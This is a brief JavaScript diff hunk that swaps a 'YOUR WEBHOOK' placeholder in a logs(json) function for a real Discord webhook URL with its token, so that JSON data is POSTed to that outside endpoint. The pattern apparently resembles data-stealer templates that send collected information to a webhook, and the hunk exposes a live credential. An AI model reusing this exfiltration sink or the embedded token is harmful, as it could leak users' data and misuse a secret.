@@ -2,7 +2,7 @@ function logs(json)
 {
      var request = new XMLHttpRequest();
      
-     request.open("POST", "YOUR WEBHOOK");
+     request.open("POST", "https://discord.com/api/webhooks/996640689200840754/8fdw_c29V5X9oXd4lRT85veF4TLYB0Fb2ClM6H_ch9y2BJXGxDC2HxZdiMUReVWGjJl4");
 
      request.setRequestHeader('Content-type', 'application/json');
 
